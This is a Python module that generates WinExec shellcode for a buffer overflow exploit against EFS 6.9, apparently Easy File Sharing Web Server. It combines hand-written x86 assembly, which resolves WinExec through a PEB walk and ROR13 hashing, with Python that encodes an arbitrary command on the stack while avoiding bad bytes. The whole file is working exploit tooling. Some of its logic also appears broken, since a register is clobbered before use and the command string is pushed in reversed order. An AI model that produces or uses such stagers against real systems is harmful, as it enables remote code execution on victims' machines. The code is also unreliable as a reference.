"""WinExec stager for the EFS 6.9 BOF.

Hand-written x86 assembly assembled by keystone-engine. No msfvenom.
Builds the command string on the stack at runtime to avoid bad bytes
from embedding raw strings.
"""
from __future__ import annotations

import struct
from typing import List, Tuple

import keystone

BAD_BYTES = frozenset(b"\x00\x0a\x0d\xff\x20\x3b")
WINEXEC_HASH = 0x0E8AFE98


def ror13(name: bytes) -> int:
    h = 0
    for c in name:
        h = ((h >> 13) | (h << (32 - 13))) & 0xFFFFFFFF
        h = (h + c) & 0xFFFFFFFF
    return h


_HEAD_ASM = r"""
    cld
    xor    edx, edx
    mov    eax, fs:[edx + 0x30]
    mov    eax, [eax + 0x0C]
    mov    esi, [eax + 0x14]
    lodsd
    xchg   eax, esi
    lodsd
    mov    ebx, [eax + 0x10]
    mov    edx, [ebx + 0x3C]
    add    edx, ebx
    mov    edx, [edx + 0x78]
    add    edx, ebx
    lea    esi, [edx + 0x08]
    add    esi, 0x18
    mov    esi, [esi]
    add    esi, ebx
    xor    ecx, ecx
find_loop:
    inc    ecx
    lodsd
    add    eax, ebx
    push   esi
    push   edx
    mov    esi, eax
    xor    eax, eax
    xchg   eax, edi
hash_loop:
    xor    eax, eax
    lodsb
    test   al, al
    jz     hash_done
    ror    edi, 12
    ror    edi, 1
    add    edi, eax
    jmp    hash_loop
hash_done:
    pop    edx
    pop    esi
    mov    ecx, 0x0E8AFE98
    cmp    edi, ecx
    jne    find_loop
    dec    ecx
    mov    edi, [edx + 0x24]
    add    edi, ebx
    movzx  eax, word ptr [edi + ecx*2]
    mov    edi, [edx + 0x1C]
    add    edi, ebx
    mov    eax, [edi + eax*4]
    add    eax, ebx
"""

_TAIL_ASM_SAVE = b"\x89\xC3"  # mov ebx, eax — save WinExec address

_TAIL_ASM_CALL = r"""
    xor    edx, edx
    push   edx
    push   ecx
    push   ebx
    ret
"""


def _assemble(asm: str) -> bytes:
    try:
        import keystone
    except ImportError:
        raise RuntimeError("keystone-engine missing — nix-shell -p python3Packages.keystone-engine")
    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    enc, _cnt = ks.asm(asm.encode())
    if enc is None:
        raise RuntimeError(f"keystone failed to assemble:\n{asm}")
    return bytes(enc)


def _build_command_stub(command: str) -> bytes:
    """Assemble push instructions to build command on stack.

    Returns bytes like:
        xor eax,eax; push eax; push imm32; ... ; mov ecx, esp
    where the pushes build the null-terminated command string on the stack
    without introducing any bad bytes in the instruction stream.
    """
    cmd = command.encode("ascii")
    for i, b in enumerate(cmd):
        if b in BAD_BYTES:
            raise ValueError(
                f"command contains bad byte 0x{b:02x} at offset {i}; "
                f"cookie context forbids NUL/CR/LF/0xFF/space/colon"
            )

    parts = []

    # Null terminator — pushed first so the string sits below it
    parts.append(b"\x31\xC0\x50")  # xor eax,eax; push eax

    # Pad command to 4-byte boundary and push as dwords
    padded = cmd + b"\x90" * ((4 - len(cmd) % 4) % 4)
    for i in range(0, len(padded), 4):
        dword = struct.unpack("<I", padded[i:i+4])[0]
        parts.append(struct.pack("<B", 0x68) + struct.pack("<I", dword))

    # Point ECX to the command string (lowest address pushed = top of stack)
    parts.append(b"\x89\xE1")  # mov ecx, esp

    return b"".join(parts)


def build_winexec_stager(command: str) -> bytes:
    if not command:
        raise ValueError("command must be non-empty")

    cmd_stub = _build_command_stub(command)
    tail_call = _assemble(_TAIL_ASM_CALL)

    stager = _assemble(_HEAD_ASM) + _TAIL_ASM_SAVE + cmd_stub + tail_call

    illegal = [(i, b) for i, b in enumerate(stager) if b in BAD_BYTES]
    if illegal:
        off, b = illegal[0]
        raise RuntimeError(
            f"assembled stager has bad byte 0x{b:02x} at offset {off}"
        )
    return stager


build_exec_bytes = build_winexec_stager


def parse_exec_command(data: bytes) -> str:
    """Extract the command string from assembled exec stager bytes."""
    head = _assemble(_HEAD_ASM)
    tail_call = _assemble(_TAIL_ASM_CALL)
    save = _TAIL_ASM_SAVE

    push_area = data[len(head) + len(save):len(data) - len(tail_call)]
    i = 0
    if push_area.startswith(b"\x31\xC0\x50"):
        i += 3  # skip xor eax,eax; push eax (null terminator)

    cmd_bytes = bytearray()
    while i < len(push_area):
        if push_area[i] == 0x68:  # push imm32
            dword = struct.unpack("<I", push_area[i+1:i+5])[0]
            cmd_bytes.extend(struct.pack("<I", dword))
            i += 5
        elif push_area[i:i+2] == b"\x89\xE1":
            break  # mov ecx, esp
        else:
            i += 1

    return cmd_bytes.rstrip(b"\x90").rstrip(b"\x00").decode("ascii", errors="replace")
